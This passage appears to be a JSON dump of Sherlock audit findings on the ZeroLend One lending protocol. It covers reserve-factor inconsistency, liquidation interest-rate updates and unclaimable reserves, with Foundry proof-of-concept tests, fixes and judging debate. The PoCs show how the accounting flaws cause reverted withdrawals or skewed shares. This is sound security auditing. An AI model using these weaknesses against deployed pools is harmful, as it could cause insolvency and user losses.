are the requirements for Medium severity:\n\n> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nThe losses exceed 0.01% and 10 USD, and the issue meets the requirements for Medium severity.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**0xSpearmint**\n\n@cvetanovv Who exactly is experiencing the loss of funds here?\n\nThe borrowers pay the expected borrow rate according to the interest rate contract.\n\nThe lenders receive the expected supply rate according to the interest rate contract.\n\nThe protocol receives the expected revenue from the reserve factor.\n\nAAVE does implement a [rescueTokens ](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/PoolLogic.sol#L75) function but it allows the owner to arbitrarily remove any amount of tokens from the pool, this is fine because AAVE governance is trusted. However, in ZeroLend pool deployment is permission-less, implementing such a function for each pool would pose a huge security risk which is why the protocol chose to not implement it. \n\nThis looks like an obvious design choice to me. \n\n**DemoreXTess**\n\n@cvetanovv I agree with @0xSpearmint. This is actually not simply a design choice. Using compounding rate for borrowers and linear rate for suppliers are recommended way to build a lending protocol. In order to keep protocols health at higher point most of the lending protocol using this way. Those money is not lost, it's always in circulation for keeping liquidity in safe point. Repaying all the debt and getting all the pools' money is not rational movement in this PoC. There is no impact here as @0xSpearmint mentioned. \n\nSecondly, I wonder @Nihavent did you solve all the problems in the protocl which is related with interest rate and accrued fund ?  Because identifying this problem with this PoC is really hard in current circumstances. We have 33 findings right now. I don't know how many of them related with those.\n\n**Nihavent**\n\nWe all seem to agree that there will be unclaimable assets building up in the pool. These are the funds that are locked in the contract, and these funds are clearly lost. \n\n>” This looks like an obvious design choice to me.”\n\nGiven that the devs implemented ‘sweep()’ in NFTPositionManager which claims tokens of much lower value, not implementing similar functionality in the Pool contract is an obvious oversight and cannot be considered design. \n\nAnother piece of evidence that this is not a design choice is the [code comment](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/utils/MathUtils.sol#L50)\n\n>”The approximation slightly underpays liquidity providers and undercharges borrowers”\n\nThe comment indicates that due to using binomial approximation (3 terms) to calculate compounding interest, borrowers slightly underpay interest and suppliers receive slightly less interest. \nThis gives us a glimpse into the dev’s intentions that the supply interest earned should be much closer (potentially even equal to) to the debt interest paid (otherwise the precision lost due to this implementation does not matter). \nThe current implementation allows a buildup of unclaimable funds which far exceeds the precision lost in the code comment. \n\n\n@0xSpearmint \n### Who lost the funds?\nIt would be up to the protocol to make a design decision as to who claims these funds. \nIf we take the code comment above it would appear that the suppliers are entitled to these funds (the suppliers must earn close to the interest repaid by borrowers for suppliers to feel the precision lost described in the code comment). \nI did not take a definitive stand on this, I don’t believe it’s require for valid medium severity. \n\n\n@DemoreXTess \n>” Using compounding rate for borrowers and linear rate for suppliers are recommended way to build a lending protocol.”\n\nThis is completely fine as long as there is a way to claim the delta between repaid debt interest and earned supply interest. If not this delta is locked in the contract. \n\n\n>” Those money is not lost, it's always in circulation for keeping liquidity in safe point. Repaying all the debt and getting all the pools' money is not rational movement in this PoC.”\n\nYes the unclaimable assets continue to be borrowed and repaid, which further increases the amount of unclaimable assets. Don’t be fooled by the fact that money is moving, a significant portion of it is unclaimable. \n\nRepaying all debt and showing that the total claimable assets is less than the total pool’s assets was the simplest way to show this issue. This is a rational situation in Zerolend with permissionless pools, many pools will become inactive and liquidity may concentrate towards ‘high performing’ pools. In the current implementation all inactive pools will have latent funds locked permanently. \n \nEven in active pools the unclaimable reserve is building up, which is why Aave fixed this problem with ‘rescueTokens’\n\n\n**cvetanovv**\n\nI agree with @Nihavent \n\nWe have a token loss that meets the Medium severity requirement.\n\n> The loss of the affected party must exceed 0.01% and 10 USD.\n\nThese tokens remain permanently locked in the contract. AAVE has implemented a `rescueTokens` function, which fixes the problem. However, I agree that the recommendation here to implement the same function is not good and may open a new vulnerability because, in the ZeroLend pool, deployment is permissionless. The issue is valid, and the ZeroLend team is left to decide if and how they will fix the stuck tokens.\n\nMy decision to reject the escalation remains.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xspearmint1](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/429/#issuecomment-2394981478): rejected",
      "summary": "\nThis bug report discusses an issue with a lending protocol where unclaimable reserve assets are accruing due to a difference in the way interest is calculated for borrowers and suppliers. This can lead to a buildup of locked funds in the contract, which cannot be retrieved by anyone. The report also mentions that this issue meets the criteria for a medium severity issue according to Sherlock's standards. However, there is some disagreement among the team about whether this is a design choice or an oversight. The report concludes by stating that the issue has been resolved successfully.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/429",
      "tags": [],
      "finders": [
        "Nihavent",
        "iamnmt"
      ]
    },
    {
      "id": "41830",
      "title": "M-9: Inconsistent Application of Reserve Factor Changes Leads to Protocol Insolvency Risk",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/402 \n\n## Found by \nA2-security, denzi\\_, zarkk01\n## Summary\n\nThe ZeroLend protocol's `PoolFactory` allows for global changes to the `reserveFactor`, which affects all pools simultaneously. However, the `ReserveLogic` contract applies this change inconsistently between interest accrual and treasury minting processes. This inconsistency leads to a mismatch between accrued interest for users and the amount minted to the treasury, causing protocol insolvency or locked funds.\n\n## Vulnerability Detail\n\nThe `reserveFactor` is a crucial parameter in the protocol that determines the portion of interest accrued from borrowers that goes to the protocol's treasury. It's defined in the `PoolFactory` contract:\n\n```js\ncontract PoolFactory is IPoolFactory, Ownable2Step {\n// ...\nuint256 public reserveFactor;\n// ...\n}\n```\n\nThis `reserveFactor` is used across all pools created by the factory. It's retrieved in various operations, such as in the `supply` function for example :\n\n```js\nfunction _supply(address asset, uint256 amount, bytes32 pos, DataTypes.ExtraData memory data) internal nonReentrant(RentrancyKind.LENDING) returns (DataTypes.SharesType memory res) {\n// ...\nres = SupplyLogic.executeSupply(\n_reserves[asset],\n_usersConfig[pos],\n_balances[asset][pos],\n_totalSupplies[asset],\nDataTypes.ExecuteSupplyParams({reserveFactor: _factory.reserveFactor(), /_ ... _/})\n);\n// ...\n}\n```\n\nThe `reserveFactor` plays a critical role in calculating interest rates and determining how much of the accrued interest goes to the liquidity providers and how much goes to the protocol's treasury . The issue arises from the fact that this `reserveFactor` can be changed globally for all pools:\n\n```js\nfunction setReserveFactor(uint256 updated) external onlyOwner {\nuint256 old = reserveFactor;\nreserveFactor = updated;\nemit ReserveFactorUpdated(old, updated, msg.sender);\n}\n```\n\n let's examine how this change affects the core logic in the `ReserveLogic` contract:\n\n```js\nfunction updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {\nif (self.lastUpdateTimestamp == uint40(block.timestamp)) return;\n\n    _updateIndexes(self, _cache);\n    _accrueToTreasury(_reserveFactor, self, _cache);\n\n    self.lastUpdateTimestamp = uint40(block.timestamp);\n\n}\n```\n\nThe vulnerability lies in the fact that `_updateIndexes` and `_accrueToTreasury` will use different `reserveFactor` values when a change occurs:\n\nif the reserveFactors is changed `_updateIndexes` will uses the old `reserveFactor` implicitly through cached liquidityRate:\n\n```js\nfunction _updateIndexes(DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {\nif (_cache.currLiquidityRate != 0) {\nuint256 cumulatedLiquidityInterest = MathUtils.calculateLinearInterest(_cache.currLiquidityRate, _cache.reserveLastUpdateTimestamp);\n_cache.nextLiquidityIndex = cumulatedLiquidityInterest.rayMul(_cache.currLiquidityIndex).toUint128();\n_reserve.liquidityIndex = _cache.nextLiquidityIndex;\n}\n// ...\n}\n```\n\n`_accrueToTreasury` will use the new `reserveFactor`:\n\n```js\nfunction _accrueToTreasury(uint256 reserveFactor, DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {\n// ...\nvars.amountToMint = vars.totalDebtAccrued.percentMul(reserveFactor);\nif (vars.amountToMint != 0) _reserve.accruedToTreasuryShares += vars.amountToMint.rayDiv(_cache.nextLiquidityIndex).toUint128();\n}\n```\n\nThis discrepancy results in the protocol minting more/less treasury shares than it should based on the actual accrued interest cause it uses the new `reserveFactor`. Over time, this can lead to a substantial overallocation/underallocation of funds to the treasury, depleting the reserves available for users or leaving funds locked in the pool contract forever.\n\n#### example scenario :\n- to simplify this issue consider the following example : \n- Deposited: `10,000 USD`\n- Borrowed: `10,000 USD`\n- Initial `reserveFactor`: `10%`\n- Borrow rate: `12%`\n- Utilization ratio: `100%`\n- Liquidity rate: `12% * (100% - 10%) = 10.8%`\n\nAfter 2 months:\n\n- Accrued interest: `200 USD`\n- `reserveFactor` changed to `30%`\n- `updateState` is called:\n  - `_updateIndexes`: Liquidity index = `(0.018 + 1) * 1 = 1.018` (based on old `10.8%` rate)\n  - `_accrueToTreasury`: Amount to mint = `200 * 0.3 = 60 USD` (using new `30%` `reserveFactor`)\n\nWhen a user attempts to withdraw:\n\n- User's assets: `10,000 * 1.018 = 10,180 USD`\n- Treasury owns: `60 USD`\n- Total required: `10,240 USD`\n\nHowever, the borrower only repaid `10,200 USD` (`10,000` principal + `200` interest), resulting in a `40 USD` shortfall. This discrepancy can lead to failed withdrawals and insolvency of the protocol.\n\n## Impact\n\nthe Chage of `reserveFactor` leads to protocol insolvency risk or locked funds. Increased `reserveFactor` causes over-minting to treasury, leaving insufficient funds for user withdrawals. Decreased `reserveFactor` results in under-minting, locking tokens in the contract permanently. Both scenarios compromise the protocol's financial integrity\n\n## Code Snippet\n\n- https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/PoolFactory.sol#L112-L116\n- https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L210\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n- Given ZeroLend's permissionless design where anyone can create a pool, updating all pools simultaneously before updating the `reserveFactor` is impractical. we recommend storing the `lastReserveFactor` used for each pool. This approach is similar to other protocols and ensures consistency between interest accrual and treasury minting.\n\nAdd a new state variable in the ReserveData struct:\n\n```diff\nstruct ReserveData {\n    // ... existing fields\n+    uint256 lastReserveFactor;\n}\n```\n\nModify the updateState function to use and update this lastReserveFactor:\n\n```diff\nfunction updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {\n    if (self.lastUpdateTimestamp == uint40(block.timestamp)) return;\n\n    _updateIndexes(self, _cache);\n-   _accrueToTreasury(_reserveFactor, self, _cache);\n+   _accrueToTreasury(self.lastReserveFactor, self, _cache);\n\n    self.lastUpdateTimestamp = uint40(block.timestamp);\n+   self.lastReserveFactor = _reserveFactor;\n}\n```\n\nThis solution ensures that the same reserveFactor is used for both interest accrual and treasury minting within each update cycle, preventing inconsistencies while allowing for global reserveFactor changes to take effect gradually across all pools.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  invalid: the cached reserveFactor is also the same used to accrue to treasury.\n\n\n\n**nevillehuang**\n\nrequest poc\n\nSeems related to #199\n\n**sherlock-admin3**\n\nPoC requested from @A2-security\n\nRequests remaining: **19**\n\n**aliX40**\n\nhey @nevillehuang  ,this is not a dup of #199 , we have #316 which is duplicate of #199 . this one is different \n- the comment : \n> invalid: the cached reserveFactor is also the same used to accrue to treasury.\nis incorrect \n\n- here a poc shows how change the factor will lead to insolvency and cause the last withdrawal not able to \nfirst we need to correct the balance calculation in [PositionBalanceConfiguration](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol): \n```diff\n  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n-     uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n-     return self.supplyShares + increase;\n+    return self.supplyShares.rayMul(index);\n  }\n\n  function getDebtBalance(DataTypes.PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {\n-     uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);\n-     return self.debtShares + increase;\n+    return self.debtShares.rayMul(index);\n  }\n```\n- add this test to [PoolRepayTests](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/test/forge/core/pool/PoolRepayTests.t.sol#L9)\n```js\n  function test_auditPoc_reserve() external {\n    console.log('balance pool before : ', tokenA.balanceOf(address(pool)));\n    _mintAndApprove(alice, tokenA, 2 * amount, address(pool));\n    vm.startPrank(alice);\n\n    pool.supplySimple(address(tokenA), alice, amount, 0); // deposit : 2000e18\n    pool.borrowSimple(address(tokenA), alice, borrowAmount, 0); // borrow : 800e18\n\n    vm.stopPrank();\n    // wrap sometime so the intrest accrue :\n    vm.warp(block.timestamp + 30 days);\n    // change reserve factor to 0.2e4 (20%):\n    poolFactory.setReserveFactor(0.2e4);\n\n    vm.startPrank(alice);\n    tokenA.approve(address(pool), UINT256_MAX);\n    pool.repaySimple(address(tokenA), UINT256_MAX, 0);\n    // withdraw all will revert cause there is not enough funds for treasury due to updating the factor :\n    vm.expectRevert();\n    pool.withdrawSimple(address(tokenA), alice, UINT256_MAX, 0);\n    vm.stopPrank();\n\n  }\n  ```\n  - the transaction will revert , because the amount accrued to treasury , doesn't exist , and please notice that this will effect all the pool in the protocol , and this amount will keep growing , since it's accumulate yield as well , which is insolvency\n\n\nThe issue described in the report, is similar to a bug found in the aave v3 codebase when updating the reserveFactor. This bug have been disclosed and fixed with the v3.1 release\nhttps://github.com/aave-dao/aave-v3-origin/blob/3aad8ca184159732e4b3d8c82cd56a8707a106a2/src/core/contracts/protocol/pool/PoolConfigurator.sol#L300C1-L315C4\n```solidity\n  function setReserveFactor(\n    address asset,\n    uint256 newReserveFactor\n  ) external override onlyRiskOrPoolAdmins {\n    require(newReserveFactor <= PercentageMath.PERCENTAGE_FACTOR, Errors.INVALID_RESERVE_FACTOR);\n\n  @>>   _pool.syncIndexesState(asset);\n\n    DataTypes.ReserveConfigurationMap memory currentConfig = _pool.getConfiguration(asset);\n    uint256 oldReserveFactor = currentConfig.getReserveFactor();\n    currentConfig.setReserveFactor(newReserveFactor);\n    _pool.setConfiguration(asset, currentConfig);\n    emit ReserveFactorChanged(asset, oldReserveFactor, newReserveFactor);\n\n    _pool.syncRatesState(asset);\n  }\n```\n\nAlso the fix we recomended is inspired by how the eulerv2 handled this, in their vault. (cache reserve factor when calling updateInterestrate, and use the cached factor when updating the index!)\n\n**0xspearmint1**\n\nescalate\n\n`setReserveFactor()` is a protocol admin function\n\nSherlock rules state\n>Admin could have an incorrect call order. Example: If an Admin forgets to setWithdrawAddress() before calling withdrawAll() This is not a valid issue.\n\n>An admin action can break certain assumptions about the functioning of the code. Example: Pausing a collateral causes some users to be unfairly liquidated or any other action causing loss of funds. This is not considered a valid issue.\n\n1. If the admin calls `forceUpdateReserve()` on the pools before calling `setReserveFactor()` this issue will not exist\n\n2. Since `setReserveFactor()` is only called by the protocol admin, according to the sherlock rules admin actions that lead to issues are not valid \n\n\n\n**sherlock-admin3**\n\n> escalate\n> \n> `setReserveFactor()` is a protocol admin function\n> \n> Sherlock rules state\n> >Admin could have an incorrect call order. Example: If an Admin forgets to setWithdrawAddress() before calling withdrawAll() This is not a valid issue.\n> \n> >An admin action can break certain assumptions about the functioning of the code. Example: Pausing a collateral causes some users to be unfairly liquidated or any other action causing loss of funds. This is not considered a valid issue.\n> \n> 1. If the admin calls `forceUpdateReserve()` on the pools before calling `setReserveFactor()` this issue will not exist\n> \n> 2. Since `setReserveFactor()` is only called by the protocol admin, according to the sherlock rules admin actions that lead to issues are not valid \n> \n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**aliX40**\n\nFirst point: \n- If the admin calls forceUpdateReserve() on the pools before calling setReserveFactor() this issue will not exist\n\nThis is not true and presents a Dos attack vector. Creating pools on zerolend is permissionless, u can't simply expect the admin to call forceUpdateReserve() on 10 of thousands of pools before changing the resrve factor. This is  simply unrealistic, costly and opens an attack vector for people to dos the treasury\nSecond point:\n- this issue doesn't expect and admin to make a mistake. Any call or changes to the reserve factor will provide damages to the deployed pools in the system. (Meaning if reserveFactor is increased or decreased there will be  a significant Impact on the system  (Please read our report for full details))\n\n**0xDenzi**\n\nI would also like to clarify further for the escalator that the 2nd point does not apply to functions which itself are broken/incomplete. The issue is not about admin missing or not executing or delaying a call or providing a wrong input. The issue is that the function is missing line/s of code to properly adjust the reserve factor.\n\n**cvetanovv**\n\nThis issue falls right between the \"Admin Input/call validation\" rules and broken functionality:\n\n> Admin could have an incorrect call order. An admin action can break certain assumptions about the functioning of the code.\n\n>Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party larger than 0.01% and 10 USD.\n\nBut I think we have broken functionality here, not an admin error.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xspearmint1](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/402/#issuecomment-2395262880): rejected",
      "summary": "\nIssue M-9: Inconsistent Application of Reserve Factor Changes Leads to Protocol Insolvency Risk\n\nSummary:\n\nThe ZeroLend protocol's `PoolFactory` allows for global changes to the `reserveFactor`, which affects all pools simultaneously. However, the `ReserveLogic` contract applies this change inconsistently between interest accrual and treasury minting processes. This results in a mismatch between accrued interest for users and the amount minted to the treasury, potentially leading to protocol insolvency or locked funds.\n\nVulnerability Detail:\n\nThe `reserveFactor` is a crucial parameter in the protocol that determines the portion of interest accrued from borrowers that goes to the protocol's treasury. It is defined in the `PoolFactory` contract and used across all pools created by the factory. However, the `reserveFactor` can be changed globally for all pools, leading to a discrepancy between the interest accrued for users and the amount minted to the treasury. This can result in overallocation or underallocation of funds to the treasury, compromising the protocol's financial integrity.\n\nImpact:\n\nThe inconsistency in applying reserve factor changes can lead to protocol insolvency risk or locked funds. Increased `reserveFactor` causes over-minting to the treasury, leaving insufficient funds for user withdrawals. Decreased `reserveFactor` results in under-minting, locking tokens in the contract permanently. Both scenarios compromise the protocol's financial integrity.\n\nRecommendation:\n\nIt is recommended to store the `lastReserveFactor` used for each pool to ensure consistency between interest accrual and treasury minting. This approach is similar to other protocols and can prevent potential discrepancies. Additionally, it is suggested to update all pools before changing the `reserveFactor` to avoid potential issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/402",
      "tags": [],
      "finders": [
        "zarkk01",
        "denzi\\_",
        "A2-security"
      ]
    },
    {
      "id": "41829",
      "title": "M-8: Liquidation fails to update the interest Rate when liquidation funds are sent to the treasury thus the next user uses an inflated index",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/401 \n\n## Found by \nA2-security, Bigsam, almurhasan, dany.armstrong90, ether\\_sky, nfmelendez, trachev\n### Summary\n\nA bug exists in the Zerolend liquidation process where the interest rate is not updated before transferring liquidation funds to the treasury. This omission leads to an inflated index being used by the next user when performing subsequent actions such as deposits, withdrawals, or borrowing, similar to the previously reported bug in the withdrawal function. As a result, the next user may receive fewer shares or incur an incorrect debt due to the artificially high liquidity rate.\n\n---\n\n\n### Root Cause\n\n\nExamples of update rate before transferring everywhere in the protocol to maintain Rate \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L69-L81\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L125-L146\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L88-L99\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L139-L158\n\nThe same process can be observed in Aave v 3.\n\n1. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L130\n2. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L65\n3. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L145-L150\n4.  https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L227-L232\n\nLooking at the effect of updating rate \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L134-L182\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/periphery/ir/DefaultReserveInterestRateStrategy.sol#L98-L131\n\nThis rates are used to get the new index\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225-L227\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L235-L237\n\n-\n\n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nDuring the liquidation process in Zerolend, when funds are transferred to the **treasury** as a liquidation protocol fee, the interest rate in the pool is **not updated** before the transfer. This failure results in the next user's interaction with the protocol (such as a deposit, withdrawal, or loan) being calculated based on an **inflated liquidity rate**. The inflated rate causes the user to receive fewer shares than they should or be charged an incorrect interest rate.\n\nIn contrast, **Aave’s approach** ensures that the interest rate is always updated when necessary and adjusted when funds are moved outside the system. Aave achieves this by transferring the funds inside the contract in the form of **aTokens**, which track liquidity changes, and since atokens are not burnt there is no need to update the interest rate accordingly in this case. \n\nZerolend, however, directly transfers funds out of the pool without recalculating the interest rate, which leads to inconsistencies in the index used by the next user.\n\n#### Code Context:\n\nIn Zerolend's liquidation process, when a user is liquidated and the liquidation fee is sent to the treasury, the protocol transfers the funds directly without updating the interest rate.\n\n```solidity\n// Transfer fee to treasury if it is non-zero\nif (vars.liquidationProtocolFeeAmount != 0) {\n    uint256 liquidityIndex = collateralReserve.getNormalizedIncome();\n    uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);\n    uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;\n\n    if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {\n        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);\n    }\n@audit >> transferring underlying asset out without updating interest rate first>>>>\n\n    IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);\n}\n```\n\nAs can be seen in the code, the liquidation protocol fee is transferred to the treasury, but no interest rate update takes place **before** the transfer. This results in an incorrect liquidity rate for the next user interaction.\n\n#### Comparison with Aave:\n\nAave uses **aTokens** for transfers within the protocol, and the interest rate is updated accordingly when funds are moved, ensuring that the liquidity rate and index are always accurate. In Aave’s liquidation process, the aTokens are transferred to the treasury rather than removing liquidity directly from the pool.\n\n```solidity\nvars.collateralAToken.transferOnLiquidation(\n    params.user,\n    vars.collateralAToken.RESERVE_TREASURY_ADDRESS(),\n    vars.liquidationProtocolFeeAmount\n);\n```\n\nIn Aave’s implementation, the **aToken** system ensures that the liquidity and interest rates are intact based on the movement of funds and not transferring underlying assets.\n\n---\n\n### Impact\n\n- **Incorrect Share Calculation**: Deposits, withdrawals, and loans after a liquidation may use an inflated liquidity rate, resulting in **fewer shares** minted for depositors or incorrect debt calculations for borrowers.\n- **Protocol Inconsistency**: The protocol operates with an inaccurate interest rate after each liquidation, leading to potential financial discrepancies across user interactions.\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nTo address this issue, the **interest rate must be updated** before transferring any liquidation protocol fees to the treasury. This ensures that the system correctly accounts for the reduction in liquidity due to the transfer. This will be my last report here before transferring funds to the treasury also a bug was discovered before transferring. kind fix also. thank you for the great opportunity to audit your code i wish zerolend the very best in the future.\n\n#### Suggested Fix:\n\nIn the liquidation logic, invoke the **`updateInterestRates`** function on the **collateral reserve** before transferring the funds to the treasury. This will ensure that the correct liquidity rate is applied to the pool before the funds are removed.\n\n##### Modified Code Example:\n\n```solidity\n\nif (vars.liquidationProtocolFeeAmount != 0) {\n    uint256 liquidityIndex = collateralReserve.getNormalizedIncome();\n    uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);\n    uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;\n\n    if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {\n        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);\n    }\n\n++   // Before transferring liquidation protocol fee to treasury, update the interest rates\n++   collateralReserve.updateInterestRates(\n++  totalSupplies,\n++  collateralReserveCache,\n++  params.collateralAsset,\n++  IPool(params.pool).getReserveFactor(),\n++  0, // No liquidity added\n++   vars.liquidationProtocolFeeAmount, // Liquidity taken during liquidation\n++  params.position,\n++ params.data.interestRateData\n++ );\n\n++ // Now, transfer fee to treasury if it is non-zero\n\n    IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);\n}\n```\n\nIn this updated version, the interest rates are recalculated **before** the liquidation protocol fee is transferred to the treasury. This ensures that subsequent deposits, withdrawals, and loans use the correct liquidity rate and avoid discrepancies caused by an inflated index.\n\n\n\n## Discussion\n\n**nevillehuang**\n\nrequest poc\n\nSeems related to #387 in terms of root cause\n\n**sherlock-admin4**\n\nPoC requested from @Tomiwasa0\n\nRequests remaining: **14**\n\n**Tomiwasa0**\n\n1. After setting liquidationProtocolFeePercentage to 20%, 20-10% using aave's examples\n\n2.  add to addresses\n\n```solidity\n  ++   address sam = address(3);\n  ++   address dav = address(4);\n```\n\n4. PASTE AND RUN THE POC\n\n```solidity\n  function _generateLiquidationCondition() internal {\n   _mintAndApprove(alice, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA\n   _mintAndApprove(sam, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA\n    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB\n     _mintAndApprove(dav, tokenA, mintAmountA, address(pool)); // bob 2000 tokenB\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0); // 550 tokenA alice supply\n    vm.stopPrank();\n\n    \n    vm.startPrank(sam);\n    pool.supplySimple(address(tokenA), sam, supplyAmountA, 0); // 550 tokenA alice supply\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0); // 100 tokenB alice borrow\n    vm.stopPrank();\n\n     vm.startPrank(sam);\n    pool.borrowSimple(address(tokenB), sam, borrowAmountB, 0); // 100 tokenB alice borrow\n    vm.stopPrank();\n    \n    vm.startPrank(bob);\n    pool.borrowSimple(address(tokenA), bob , 500e18, 0); // 100 tokenB alice borrow\n    vm.stopPrank();\n     // Get the current block timestamp\n        uint256 currentTime = block.timestamp;\n\n    // Set the block.timestamp to current time plus 100 seconds\n        vm.warp(currentTime + 1000);\n\n\n    assertEq(tokenB.balanceOf(alice), borrowAmountB);\n\n    oracleA.updateAnswer(0.45e8);\n  }\n\n``` \n\n**Updated Liquidation  Function:**\n\n```solidity\nfunction testLiquidationSimple2() external {\n    _generateLiquidationCondition();\n    (, uint256 totalDebtBase,,,,) = pool.getUserAccountData(alice, 0);\n\n    vm.startPrank(bob);\n    // vm.expectEmit(true, true, true, false);\n    // emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 100 ether);\n\n    vm.stopPrank();\n\n    (, uint256 totalDebtBaseNew,,,,) = pool.getUserAccountData(alice, 0);\n\n    assertTrue(totalDebtBase > totalDebtBaseNew);\n    \n    // Get the current block timestamp\n    uint256 currentTime3 = block.timestamp;\n\n    // Set the block.timestamp to current time plus 100 seconds\n    vm.warp(currentTime3 + 500);\n\n    vm.startPrank(dav);\n    pool.supplySimple(address(tokenA), dav, 100e18, 0); // 550 tokenA alice supply\n    vm.stopPrank();\n   \n    assertEq(pool.getBalanceRaw(address(tokenA), dav, 0).supplyShares, 99999784100498438999);\n}\n```\n\n\nBefore Updating the index with Amount minted to tresury\ndav got - 99999784100498438999;\nAfter update - 99999783033155331339,\n\n\n```solidity\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 67.39ms (15.32ms CPU time)\n\nRan 1 test suite in 2.36s (67.39ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in 